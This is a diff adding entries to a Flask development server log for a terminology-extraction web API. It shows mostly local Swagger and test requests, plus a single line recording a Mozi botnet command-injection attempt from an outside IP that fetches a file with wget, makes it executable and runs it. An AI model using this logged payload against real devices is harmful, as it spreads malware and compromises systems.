@@ -4717,3 +4717,321 @@ AssertionError: applications must write bytes
 12:40:28, INFO  * Restarting with fsevents reloader
 12:40:34, WARNING  * Debugger is active!
 12:40:34, INFO  * Debugger PIN: 273-160-618
+16:12:06, INFO  * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+16:12:06, INFO  * Restarting with fsevents reloader
+16:12:11, WARNING  * Debugger is active!
+16:12:11, INFO  * Debugger PIN: 146-515-319
+16:12:50, INFO 127.0.0.1 - - [09/Jun/2021 16:12:50] "GET /swagger/ HTTP/1.1" 200 -
+16:12:50, INFO 127.0.0.1 - - [09/Jun/2021 16:12:50] "GET /swagger/swagger-ui.css HTTP/1.1" 200 -
+16:12:50, INFO 127.0.0.1 - - [09/Jun/2021 16:12:50] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+16:12:50, INFO 127.0.0.1 - - [09/Jun/2021 16:12:50] "GET /swagger/swagger-ui-standalone-preset.js HTTP/1.1" 200 -
+16:12:51, INFO 127.0.0.1 - - [09/Jun/2021 16:12:51] "GET /static/swagger.json HTTP/1.1" 200 -
+16:12:51, INFO 127.0.0.1 - - [09/Jun/2021 16:12:51] "GET /swagger/favicon-32x32.png HTTP/1.1" 304 -
+16:39:37, INFO  * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+16:39:37, INFO  * Restarting with fsevents reloader
+16:39:46, WARNING  * Debugger is active!
+16:39:46, INFO  * Debugger PIN: 273-160-618
+16:39:51, INFO 127.0.0.1 - - [09/Jun/2021 16:39:51] "GET /swagger/ HTTP/1.1" 200 -
+16:39:51, INFO 127.0.0.1 - - [09/Jun/2021 16:39:51] "GET /swagger/ HTTP/1.1" 200 -
+16:39:51, INFO 127.0.0.1 - - [09/Jun/2021 16:39:51] "GET /swagger/swagger-ui.css HTTP/1.1" 200 -
+16:39:51, INFO 127.0.0.1 - - [09/Jun/2021 16:39:51] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+16:39:51, INFO 127.0.0.1 - - [09/Jun/2021 16:39:51] "GET /swagger/swagger-ui-standalone-preset.js HTTP/1.1" 200 -
+16:39:52, INFO 127.0.0.1 - - [09/Jun/2021 16:39:52] "GET /static/swagger.json HTTP/1.1" 200 -
+16:39:52, INFO 127.0.0.1 - - [09/Jun/2021 16:39:52] "GET /swagger/favicon-32x32.png HTTP/1.1" 200 -
+16:44:42, INFO  * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+16:44:42, INFO  * Restarting with fsevents reloader
+16:44:46, WARNING  * Debugger is active!
+16:44:46, INFO  * Debugger PIN: 361-735-195
+16:44:51, INFO 127.0.0.1 - - [09/Jun/2021 16:44:51] "GET /swagger/ HTTP/1.1" 200 -
+16:44:51, INFO 127.0.0.1 - - [09/Jun/2021 16:44:51] "GET /swagger/ HTTP/1.1" 200 -
+16:44:51, INFO 127.0.0.1 - - [09/Jun/2021 16:44:51] "GET /swagger/swagger-ui.css HTTP/1.1" 200 -
+16:44:51, INFO 127.0.0.1 - - [09/Jun/2021 16:44:51] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+16:44:51, INFO 127.0.0.1 - - [09/Jun/2021 16:44:51] "GET /swagger/swagger-ui-standalone-preset.js HTTP/1.1" 200 -
+16:44:52, INFO 127.0.0.1 - - [09/Jun/2021 16:44:52] "GET /static/swagger.json HTTP/1.1" 200 -
+09:42:53, INFO 127.0.0.1 - - [10/Jun/2021 09:42:53] "GET / HTTP/1.1" 200 -
+09:42:54, INFO 127.0.0.1 - - [10/Jun/2021 09:42:54] "GET /static/reset.css HTTP/1.1" 200 -
+09:42:54, INFO 127.0.0.1 - - [10/Jun/2021 09:42:54] "GET /static/style.css HTTP/1.1" 200 -
+09:42:54, INFO 127.0.0.1 - - [10/Jun/2021 09:42:54] "GET /static/fontello.css HTTP/1.1" 200 -
+09:42:54, INFO 127.0.0.1 - - [10/Jun/2021 09:42:54] "GET /static/images/termitup_logo_oeg_notermita.svg HTTP/1.1" 200 -
+09:42:54, INFO 127.0.0.1 - - [10/Jun/2021 09:42:54] "GET /static/images/termitup_arch.png HTTP/1.1" 200 -
+09:42:54, INFO 127.0.0.1 - - [10/Jun/2021 09:42:54] "GET /static/images/logopal.png HTTP/1.1" 200 -
+09:42:54, INFO 127.0.0.1 - - [10/Jun/2021 09:42:54] "GET /static/images/Logo_OEG.gif HTTP/1.1" 200 -
+09:42:54, INFO 127.0.0.1 - - [10/Jun/2021 09:42:54] "GET /static/images/fi.jpg HTTP/1.1" 200 -
+09:42:54, INFO 127.0.0.1 - - [10/Jun/2021 09:42:54] "GET /static/images/upm.jpg HTTP/1.1" 200 -
+09:42:54, INFO 127.0.0.1 - - [10/Jun/2021 09:42:54] "GET /favicon.ico HTTP/1.1" 404 -
+12:31:57, INFO  * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+12:31:57, INFO  * Restarting with fsevents reloader
+12:32:03, WARNING  * Debugger is active!
+12:32:03, INFO  * Debugger PIN: 273-160-618
+12:32:08, INFO 127.0.0.1 - - [18/Jun/2021 12:32:08] "GET /swagger HTTP/1.1" 308 -
+12:32:08, INFO 127.0.0.1 - - [18/Jun/2021 12:32:08] "GET /swagger/ HTTP/1.1" 200 -
+12:32:08, INFO 127.0.0.1 - - [18/Jun/2021 12:32:08] "GET /swagger/swagger-ui.css HTTP/1.1" 200 -
+12:32:08, INFO 127.0.0.1 - - [18/Jun/2021 12:32:08] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+12:32:08, INFO 127.0.0.1 - - [18/Jun/2021 12:32:08] "GET /swagger/swagger-ui-standalone-preset.js HTTP/1.1" 200 -
+12:32:08, INFO 127.0.0.1 - - [18/Jun/2021 12:32:08] "GET /static/swagger.json HTTP/1.1" 200 -
+12:32:09, INFO 127.0.0.1 - - [18/Jun/2021 12:32:09] "GET /swagger/favicon-32x32.png HTTP/1.1" 200 -
+12:32:21, INFO 127.0.0.1 - - [18/Jun/2021 12:32:21] "POST /extract_terminology?corpus=test HTTP/1.1" 404 -
+12:33:11, INFO  * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+12:33:11, INFO  * Restarting with fsevents reloader
+12:33:15, WARNING  * Debugger is active!
+12:33:15, INFO  * Debugger PIN: 273-160-618
+12:33:20, INFO 127.0.0.1 - - [18/Jun/2021 12:33:20] "GET /swagger/ HTTP/1.1" 200 -
+12:33:20, INFO 127.0.0.1 - - [18/Jun/2021 12:33:20] "GET /swagger/swagger-ui.css HTTP/1.1" 200 -
+12:33:20, INFO 127.0.0.1 - - [18/Jun/2021 12:33:20] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+12:33:20, INFO 127.0.0.1 - - [18/Jun/2021 12:33:20] "GET /swagger/swagger-ui-standalone-preset.js HTTP/1.1" 200 -
+12:33:20, INFO 127.0.0.1 - - [18/Jun/2021 12:33:20] "GET /static/swagger.json HTTP/1.1" 200 -
+12:33:27, INFO 127.0.0.1 - - [18/Jun/2021 12:33:27] "POST /extract_terminology?lang_in=en&corpus=string HTTP/1.1" 404 -
+12:35:39, INFO 128.14.133.58 - - [18/Jun/2021 12:35:39] "GET / HTTP/1.1" 200 -
+13:26:51, ERROR 182.123.74.198 - - [18/Jun/2021 13:26:51] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
+13:26:51, INFO 182.123.74.198 - - [18/Jun/2021 13:26:51] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" HTTPStatus.BAD_REQUEST -
+14:07:14, INFO 196.196.41.68 - - [18/Jun/2021 14:07:14] "GET / HTTP/1.1" 200 -
+12:17:16, INFO  * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+12:17:16, INFO  * Restarting with fsevents reloader
+12:17:22, WARNING  * Debugger is active!
+12:17:22, INFO  * Debugger PIN: 273-160-618
+12:17:27, INFO 127.0.0.1 - - [21/Jun/2021 12:17:27] "GET /swagger/ HTTP/1.1" 200 -
+12:17:27, INFO 127.0.0.1 - - [21/Jun/2021 12:17:27] "GET /swagger/swagger-ui.css HTTP/1.1" 200 -
+12:17:27, INFO 127.0.0.1 - - [21/Jun/2021 12:17:27] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+12:17:27, INFO 127.0.0.1 - - [21/Jun/2021 12:17:27] "GET /swagger/swagger-ui-standalone-preset.js HTTP/1.1" 200 -
+12:17:27, INFO 127.0.0.1 - - [21/Jun/2021 12:17:27] "GET /static/swagger.json HTTP/1.1" 200 -
+12:17:27, INFO 127.0.0.1 - - [21/Jun/2021 12:17:27] "GET /swagger/favicon-32x32.png HTTP/1.1" 304 -
+11:30:08, INFO 209.141.61.16 - - [22/Jun/2021 11:30:08] "GET / HTTP/1.0" 200 -
+12:30:05, INFO 64.62.197.212 - - [22/Jun/2021 12:30:05] "GET / HTTP/1.1" 200 -
+13:21:40, INFO 81.16.127.74 - - [22/Jun/2021 13:21:40] "GET / HTTP/1.0" 200 -
+12:13:13, INFO 127.0.0.1 - - [23/Jun/2021 12:13:13] "GET /swagger/ HTTP/1.1" 200 -
+12:13:13, INFO 127.0.0.1 - - [23/Jun/2021 12:13:13] "GET /swagger/ HTTP/1.1" 200 -
+12:13:14, INFO 127.0.0.1 - - [23/Jun/2021 12:13:14] "GET /swagger/swagger-ui-standalone-preset.js HTTP/1.1" 200 -
+12:13:14, INFO 127.0.0.1 - - [23/Jun/2021 12:13:14] "GET /swagger/swagger-ui.css HTTP/1.1" 304 -
+12:13:14, INFO 127.0.0.1 - - [23/Jun/2021 12:13:14] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+12:13:15, INFO 127.0.0.1 - - [23/Jun/2021 12:13:15] "GET /static/swagger.json HTTP/1.1" 200 -
+12:13:15, INFO 127.0.0.1 - - [23/Jun/2021 12:13:15] "GET /swagger/favicon-32x32.png HTTP/1.1" 200 -
+12:16:11, INFO  * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+12:16:11, INFO  * Restarting with fsevents reloader
+12:16:29, WARNING  * Debugger is active!
+12:16:29, INFO  * Debugger PIN: 273-160-618
+12:16:34, INFO 127.0.0.1 - - [23/Jun/2021 12:16:34] "GET /swagger/ HTTP/1.1" 200 -
+12:16:34, INFO 127.0.0.1 - - [23/Jun/2021 12:16:34] "GET /swagger/swagger-ui.css HTTP/1.1" 200 -
+12:16:34, INFO 127.0.0.1 - - [23/Jun/2021 12:16:34] "GET /swagger/swagger-ui-standalone-preset.js HTTP/1.1" 200 -
+12:16:34, INFO 127.0.0.1 - - [23/Jun/2021 12:16:34] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+12:16:36, INFO 127.0.0.1 - - [23/Jun/2021 12:16:36] "GET /static/swagger.json HTTP/1.1" 200 -
+12:16:36, INFO 127.0.0.1 - - [23/Jun/2021 12:16:36] "GET /swagger/favicon-32x32.png HTTP/1.1" 200 -
+12:17:02, INFO 127.0.0.1 - - [23/Jun/2021 12:17:02] "POST /extract_terminology?lang_in=es&corpus=esto%20es%20un%20corpus%20de%20donde%20se%20tienen%20que%20sacar%20terminos.%20sácame%20un%20término.%20término HTTP/1.1" 404 -
+12:25:04, INFO  * Detected change in '/Users/pmchozas/Documents/GitHub/paltermitup/request_api.py', reloading
+12:25:04, INFO  * Detected change in '/Users/pmchozas/Documents/GitHub/paltermitup/request_api.py', reloading
+12:25:07, INFO  * Restarting with fsevents reloader
+12:25:18, WARNING  * Debugger is active!
+12:25:18, INFO  * Debugger PIN: 273-160-618
+12:25:36, INFO  * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+12:25:36, INFO  * Restarting with fsevents reloader
+12:25:52, WARNING  * Debugger is active!
+12:25:52, INFO  * Debugger PIN: 273-160-618
+12:25:57, INFO 127.0.0.1 - - [23/Jun/2021 12:25:57] "GET /swagger/ HTTP/1.1" 200 -
+12:25:57, INFO 127.0.0.1 - - [23/Jun/2021 12:25:57] "GET /swagger/swagger-ui.css HTTP/1.1" 200 -
+12:25:57, INFO 127.0.0.1 - - [23/Jun/2021 12:25:57] "GET /swagger/swagger-ui-standalone-preset.js HTTP/1.1" 200 -
+12:25:57, INFO 127.0.0.1 - - [23/Jun/2021 12:25:57] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+12:25:59, INFO 127.0.0.1 - - [23/Jun/2021 12:25:59] "GET /static/swagger.json HTTP/1.1" 200 -
+12:26:14, INFO 127.0.0.1 - - [23/Jun/2021 12:26:14] "POST /extract_terminology?corpus=esto%20es%20un%20corpus%20de%20prueba%20de%20donde%20se%20tienen%20que%20sacar%20términos. HTTP/1.1" 404 -
+12:28:25, INFO  * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+12:28:25, INFO  * Restarting with fsevents reloader
+12:28:36, WARNING  * Debugger is active!
+12:28:36, INFO  * Debugger PIN: 273-160-618
+12:28:45, INFO  * Detected change in '/Users/pmchozas/Documents/GitHub/paltermitup/request_api.py', reloading
+12:28:59, INFO  * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+12:28:59, INFO  * Restarting with fsevents reloader
+12:29:19, WARNING  * Debugger is active!
+12:29:19, INFO  * Debugger PIN: 273-160-618
+12:29:24, INFO 127.0.0.1 - - [23/Jun/2021 12:29:24] "GET /swagger/ HTTP/1.1" 200 -
+12:29:25, INFO 127.0.0.1 - - [23/Jun/2021 12:29:25] "GET /swagger/swagger-ui-standalone-preset.js HTTP/1.1" 200 -
+12:29:25, INFO 127.0.0.1 - - [23/Jun/2021 12:29:25] "GET /swagger/swagger-ui.css HTTP/1.1" 200 -
+12:29:25, INFO 127.0.0.1 - - [23/Jun/2021 12:29:25] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+12:29:26, INFO 127.0.0.1 - - [23/Jun/2021 12:29:26] "GET /static/swagger.json HTTP/1.1" 200 -
+12:29:41, INFO 127.0.0.1 - - [23/Jun/2021 12:29:41] "POST /extract_terminology/es?corpus=esto%20es%20un%20corpus%20de%20prueba%20de%20donde%20se%20tienen%20que%20sacar%20términos. HTTP/1.1" 200 -
+14:29:04, INFO  * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+14:29:04, INFO  * Restarting with fsevents reloader
+14:29:11, WARNING  * Debugger is active!
+14:29:11, INFO  * Debugger PIN: 273-160-618
+14:29:16, INFO 127.0.0.1 - - [23/Jun/2021 14:29:16] "GET /swagger/ HTTP/1.1" 200 -
+14:29:16, INFO 127.0.0.1 - - [23/Jun/2021 14:29:16] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+14:29:19, INFO 127.0.0.1 - - [23/Jun/2021 14:29:19] "GET /swagger/favicon-32x32.png HTTP/1.1" 200 -
+14:29:29, INFO 127.0.0.1 - - [23/Jun/2021 14:29:29] "GET / HTTP/1.1" 200 -
+14:29:29, INFO 127.0.0.1 - - [23/Jun/2021 14:29:29] "GET /static/reset.css HTTP/1.1" 200 -
+14:29:29, INFO 127.0.0.1 - - [23/Jun/2021 14:29:29] "GET /static/style.css HTTP/1.1" 200 -
+14:29:29, INFO 127.0.0.1 - - [23/Jun/2021 14:29:29] "GET /static/fontello.css HTTP/1.1" 200 -
+14:29:29, INFO 127.0.0.1 - - [23/Jun/2021 14:29:29] "GET /static/images/termitup_logo_oeg_notermita.svg HTTP/1.1" 200 -
+14:29:29, INFO 127.0.0.1 - - [23/Jun/2021 14:29:29] "GET /static/images/termitup_arch.png HTTP/1.1" 200 -
+14:29:29, INFO 127.0.0.1 - - [23/Jun/2021 14:29:29] "GET /static/images/logopal.png HTTP/1.1" 200 -
+14:29:29, INFO 127.0.0.1 - - [23/Jun/2021 14:29:29] "GET /static/images/Logo_OEG.gif HTTP/1.1" 200 -
+14:29:30, INFO 127.0.0.1 - - [23/Jun/2021 14:29:30] "GET /static/images/upm.jpg HTTP/1.1" 200 -
+14:29:30, INFO 127.0.0.1 - - [23/Jun/2021 14:29:30] "GET /static/images/fi.jpg HTTP/1.1" 200 -
+14:29:31, INFO 127.0.0.1 - - [23/Jun/2021 14:29:31] "GET /favicon.ico HTTP/1.1" 404 -
+14:26:34, INFO  * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+14:26:34, INFO  * Restarting with fsevents reloader
+14:26:40, WARNING  * Debugger is active!
+14:26:40, INFO  * Debugger PIN: 273-160-618
+14:26:43, INFO 127.0.0.1 - - [01/Jul/2021 14:26:43] "GET / HTTP/1.1" 200 -
+14:26:44, INFO 127.0.0.1 - - [01/Jul/2021 14:26:44] "GET /static/reset.css HTTP/1.1" 304 -
+14:26:44, INFO 127.0.0.1 - - [01/Jul/2021 14:26:44] "GET /static/style.css HTTP/1.1" 200 -
+14:26:44, INFO 127.0.0.1 - - [01/Jul/2021 14:26:44] "GET /static/fontello.css HTTP/1.1" 304 -
+14:26:44, INFO 127.0.0.1 - - [01/Jul/2021 14:26:44] "GET /static/images/termitup_arch.png HTTP/1.1" 200 -
+14:26:44, INFO 127.0.0.1 - - [01/Jul/2021 14:26:44] "GET /static/images/termitup_logo_oeg_notermita.svg HTTP/1.1" 304 -
+14:26:44, INFO 127.0.0.1 - - [01/Jul/2021 14:26:44] "GET /static/images/logopal.png HTTP/1.1" 200 -
+14:26:44, INFO 127.0.0.1 - - [01/Jul/2021 14:26:44] "GET /static/images/Logo_OEG.gif HTTP/1.1" 200 -
+14:26:44, INFO 127.0.0.1 - - [01/Jul/2021 14:26:44] "GET /static/images/fi.jpg HTTP/1.1" 200 -
+14:26:44, INFO 127.0.0.1 - - [01/Jul/2021 14:26:44] "GET /static/images/upm.jpg HTTP/1.1" 200 -
+14:26:44, INFO 127.0.0.1 - - [01/Jul/2021 14:26:44] "GET /favicon.ico HTTP/1.1" 404 -
+12:07:44, INFO  * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+12:07:44, INFO  * Restarting with fsevents reloader
+12:07:51, WARNING  * Debugger is active!
+12:07:51, INFO  * Debugger PIN: 273-160-618
+12:07:54, INFO 127.0.0.1 - - [03/Jul/2021 12:07:54] "GET / HTTP/1.1" 200 -
+12:07:54, INFO 127.0.0.1 - - [03/Jul/2021 12:07:54] "GET /static/reset.css HTTP/1.1" 304 -
+12:07:54, INFO 127.0.0.1 - - [03/Jul/2021 12:07:54] "GET /static/images/termitup_arch.png HTTP/1.1" 200 -
+12:07:54, INFO 127.0.0.1 - - [03/Jul/2021 12:07:54] "GET /static/images/logopal.png HTTP/1.1" 200 -
+12:07:54, INFO 127.0.0.1 - - [03/Jul/2021 12:07:54] "GET /static/fontello.css HTTP/1.1" 304 -
+12:07:54, INFO 127.0.0.1 - - [03/Jul/2021 12:07:54] "GET /static/style.css HTTP/1.1" 304 -
+12:07:54, INFO 127.0.0.1 - - [03/Jul/2021 12:07:54] "GET /static/images/termitup_logo_oeg_notermita.svg HTTP/1.1" 304 -
+12:07:54, INFO 127.0.0.1 - - [03/Jul/2021 12:07:54] "GET /static/images/Logo_OEG.gif HTTP/1.1" 304 -
+12:07:54, INFO 127.0.0.1 - - [03/Jul/2021 12:07:54] "GET /static/images/fi.jpg HTTP/1.1" 200 -
+12:07:54, INFO 127.0.0.1 - - [03/Jul/2021 12:07:54] "GET /static/images/upm.jpg HTTP/1.1" 200 -
+12:08:16, INFO 127.0.0.1 - - [03/Jul/2021 12:08:16] "GET /swagger/ HTTP/1.1" 200 -
+12:08:17, INFO 127.0.0.1 - - [03/Jul/2021 12:08:17] "GET /swagger/swagger-ui.css HTTP/1.1" 200 -
+12:08:17, INFO 127.0.0.1 - - [03/Jul/2021 12:08:17] "GET /swagger/swagger-ui-standalone-preset.js HTTP/1.1" 200 -
+12:08:17, INFO 127.0.0.1 - - [03/Jul/2021 12:08:17] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+12:08:17, INFO 127.0.0.1 - - [03/Jul/2021 12:08:17] "GET /static/swagger.json HTTP/1.1" 200 -
+12:08:17, INFO 127.0.0.1 - - [03/Jul/2021 12:08:17] "GET /swagger/favicon-32x32.png HTTP/1.1" 304 -
+12:14:55, INFO  * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+12:14:55, INFO  * Restarting with fsevents reloader
+12:15:00, WARNING  * Debugger is active!
+12:15:00, INFO  * Debugger PIN: 273-160-618
+12:15:03, INFO 127.0.0.1 - - [03/Jul/2021 12:15:03] "GET /swagger/ HTTP/1.1" 200 -
+12:15:03, INFO 127.0.0.1 - - [03/Jul/2021 12:15:03] "GET /swagger/swagger-ui.css HTTP/1.1" 200 -
+12:15:03, INFO 127.0.0.1 - - [03/Jul/2021 12:15:03] "GET /swagger/swagger-ui-standalone-preset.js HTTP/1.1" 200 -
+12:15:03, INFO 127.0.0.1 - - [03/Jul/2021 12:15:03] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+12:15:04, INFO 127.0.0.1 - - [03/Jul/2021 12:15:04] "GET /static/swagger.json HTTP/1.1" 200 -
+12:16:30, INFO  * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+12:16:30, INFO  * Restarting with fsevents reloader
+12:16:36, WARNING  * Debugger is active!
+12:16:36, INFO  * Debugger PIN: 273-160-618
+12:16:36, INFO 127.0.0.1 - - [03/Jul/2021 12:16:36] "GET /swagger/ HTTP/1.1" 200 -
+12:16:36, INFO 127.0.0.1 - - [03/Jul/2021 12:16:36] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+12:16:36, INFO 127.0.0.1 - - [03/Jul/2021 12:16:36] "GET /swagger/swagger-ui.css HTTP/1.1" 200 -
+12:16:36, INFO 127.0.0.1 - - [03/Jul/2021 12:16:36] "GET /swagger/swagger-ui-standalone-preset.js HTTP/1.1" 200 -
+12:16:36, INFO 127.0.0.1 - - [03/Jul/2021 12:16:36] "GET /static/swagger.json HTTP/1.1" 200 -
+12:17:41, INFO  * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+12:17:41, INFO  * Restarting with fsevents reloader
+12:17:47, WARNING  * Debugger is active!
+12:17:47, INFO  * Debugger PIN: 273-160-618
+12:17:47, INFO 127.0.0.1 - - [03/Jul/2021 12:17:47] "GET /swagger/ HTTP/1.1" 200 -
+12:17:47, INFO 127.0.0.1 - - [03/Jul/2021 12:17:47] "GET /swagger/swagger-ui.css HTTP/1.1" 200 -
+12:17:47, INFO 127.0.0.1 - - [03/Jul/2021 12:17:47] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+12:17:47, INFO 127.0.0.1 - - [03/Jul/2021 12:17:47] "GET /swagger/swagger-ui-standalone-preset.js HTTP/1.1" 200 -
+12:17:47, INFO 127.0.0.1 - - [03/Jul/2021 12:17:47] "GET /static/swagger.json HTTP/1.1" 200 -
+12:23:29, INFO  * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+12:23:29, INFO  * Restarting with fsevents reloader
+12:23:35, WARNING  * Debugger is active!
+12:23:35, INFO  * Debugger PIN: 273-160-618
+12:23:35, INFO 127.0.0.1 - - [03/Jul/2021 12:23:35] "GET /swagger/ HTTP/1.1" 200 -
+12:23:35, INFO 127.0.0.1 - - [03/Jul/2021 12:23:35] "GET /swagger/swagger-ui.css HTTP/1.1" 200 -
+12:23:35, INFO 127.0.0.1 - - [03/Jul/2021 12:23:35] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+12:23:35, INFO 127.0.0.1 - - [03/Jul/2021 12:23:35] "GET /swagger/swagger-ui-standalone-preset.js HTTP/1.1" 200 -
+12:23:35, INFO 127.0.0.1 - - [03/Jul/2021 12:23:35] "GET /static/swagger.json HTTP/1.1" 200 -
+12:25:42, INFO  * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+12:25:42, INFO  * Restarting with fsevents reloader
+12:25:45, WARNING  * Debugger is active!
+12:25:45, INFO  * Debugger PIN: 273-160-618
+12:25:50, INFO 127.0.0.1 - - [03/Jul/2021 12:25:50] "GET /swagger/ HTTP/1.1" 200 -
+12:25:50, INFO 127.0.0.1 - - [03/Jul/2021 12:25:50] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+12:25:50, INFO 127.0.0.1 - - [03/Jul/2021 12:25:50] "GET /swagger/swagger-ui.css HTTP/1.1" 200 -
+12:25:50, INFO 127.0.0.1 - - [03/Jul/2021 12:25:50] "GET /swagger/swagger-ui-standalone-preset.js HTTP/1.1" 200 -
+12:25:50, INFO 127.0.0.1 - - [03/Jul/2021 12:25:50] "GET /static/swagger.json HTTP/1.1" 200 -
+12:34:13, INFO  * Detected change in '/Users/pmchozas/Documents/GitHub/paltermitup/request_api.py', reloading
+12:34:15, INFO  * Restarting with fsevents reloader
+12:34:20, WARNING  * Debugger is active!
+12:34:20, INFO  * Debugger PIN: 273-160-618
+12:35:14, INFO  * Detected change in '/Users/pmchozas/Documents/GitHub/paltermitup/request_api.py', reloading
+12:35:16, INFO  * Restarting with fsevents reloader
+12:35:21, WARNING  * Debugger is active!
+12:35:21, INFO  * Debugger PIN: 273-160-618
+12:51:54, INFO  * Detected change in '/Users/pmchozas/Documents/GitHub/paltermitup/request_api.py', reloading
+12:51:54, INFO  * Detected change in '/Users/pmchozas/Documents/GitHub/paltermitup/request_api.py', reloading
+12:51:57, INFO  * Restarting with fsevents reloader
+12:52:02, WARNING  * Debugger is active!
+12:52:02, INFO  * Debugger PIN: 273-160-618
+12:55:53, INFO  * Detected change in '/Users/pmchozas/Documents/GitHub/paltermitup/request_api.py', reloading
+12:55:53, INFO  * Detected change in '/Users/pmchozas/Documents/GitHub/paltermitup/request_api.py', reloading
+12:55:55, INFO  * Restarting with fsevents reloader
+12:56:01, WARNING  * Debugger is active!
+12:56:01, INFO  * Debugger PIN: 273-160-618
+12:59:04, INFO  * Detected change in '/Users/pmchozas/Documents/GitHub/paltermitup/request_api.py', reloading
+12:59:04, INFO  * Detected change in '/Users/pmchozas/Documents/GitHub/paltermitup/request_api.py', reloading
+12:59:06, INFO  * Restarting with fsevents reloader
+12:59:11, WARNING  * Debugger is active!
+12:59:11, INFO  * Debugger PIN: 273-160-618
+12:59:19, INFO 127.0.0.1 - - [03/Jul/2021 12:59:19] "GET /swagger/ HTTP/1.1" 200 -
+12:59:19, INFO 127.0.0.1 - - [03/Jul/2021 12:59:19] "GET /swagger/swagger-ui.css HTTP/1.1" 200 -
+12:59:19, INFO 127.0.0.1 - - [03/Jul/2021 12:59:19] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+12:59:19, INFO 127.0.0.1 - - [03/Jul/2021 12:59:19] "GET /swagger/swagger-ui-standalone-preset.js HTTP/1.1" 200 -
+12:59:20, INFO 127.0.0.1 - - [03/Jul/2021 12:59:20] "GET /static/swagger.json HTTP/1.1" 200 -
+12:59:20, INFO 127.0.0.1 - - [03/Jul/2021 12:59:20] "GET /swagger/favicon-32x32.png HTTP/1.1" 200 -
+13:05:41, INFO 127.0.0.1 - - [03/Jul/2021 13:05:41] "GET /swagger/ HTTP/1.1" 200 -
+13:05:41, INFO 127.0.0.1 - - [03/Jul/2021 13:05:41] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+13:05:41, INFO 127.0.0.1 - - [03/Jul/2021 13:05:41] "GET /swagger/swagger-ui.css HTTP/1.1" 200 -
+13:05:41, INFO 127.0.0.1 - - [03/Jul/2021 13:05:41] "GET /swagger/swagger-ui-standalone-preset.js HTTP/1.1" 200 -
+13:05:42, INFO 127.0.0.1 - - [03/Jul/2021 13:05:42] "GET /static/swagger.json HTTP/1.1" 200 -
+13:05:48, INFO 127.0.0.1 - - [03/Jul/2021 13:05:48] "POST /extract_terminology HTTP/1.1" 400 -
+13:05:59, INFO 127.0.0.1 - - [03/Jul/2021 13:05:59] "POST /extract_terminology HTTP/1.1" 200 -
+13:25:24, INFO  * Detected change in '/Users/pmchozas/Documents/GitHub/paltermitup/modules_api/st_extraction.py', reloading
+13:25:24, INFO  * Detected change in '/Users/pmchozas/Documents/GitHub/paltermitup/modules_api/st_extraction.py', reloading
+13:25:26, INFO  * Restarting with fsevents reloader
+13:25:32, WARNING  * Debugger is active!
+13:25:32, INFO  * Debugger PIN: 273-160-618
+13:25:40, INFO 127.0.0.1 - - [03/Jul/2021 13:25:40] "GET /swagger/ HTTP/1.1" 200 -
+13:25:40, INFO 127.0.0.1 - - [03/Jul/2021 13:25:40] "GET /swagger/swagger-ui.css HTTP/1.1" 200 -
+13:25:40, INFO 127.0.0.1 - - [03/Jul/2021 13:25:40] "GET /swagger/swagger-ui-bundle.js HTTP/1.1" 200 -
+13:25:40, INFO 127.0.0.1 - - [03/Jul/2021 13:25:40] "GET /swagger/swagger-ui-standalone-preset.js HTTP/1.1" 200 -
+13:25:40, INFO 127.0.0.1 - - [03/Jul/2021 13:25:40] "GET /static/swagger.json HTTP/1.1" 200 -
+13:25:46, INFO 127.0.0.1 - - [03/Jul/2021 13:25:46] "POST /extract_terminology HTTP/1.1" 200 -
+13:26:56, INFO  * Detected change in '/Users/pmchozas/Documents/GitHub/paltermitup/modules_api/st_extraction.py', reloading
+13:26:56, INFO  * Detected change in '/Users/pmchozas/Documents/GitHub/paltermitup/modules_api/st_extraction.py', reloading
+13:26:58, INFO  * Restarting with fsevents reloader
+13:27:06, WARNING  * Debugger is active!
+13:27:06, INFO  * Debugger PIN: 273-160-618
+13:27:59, INFO 127.0.0.1 - - [03/Jul/2021 13:27:59] "GET /swagger/ HTTP/1.1" 200 -
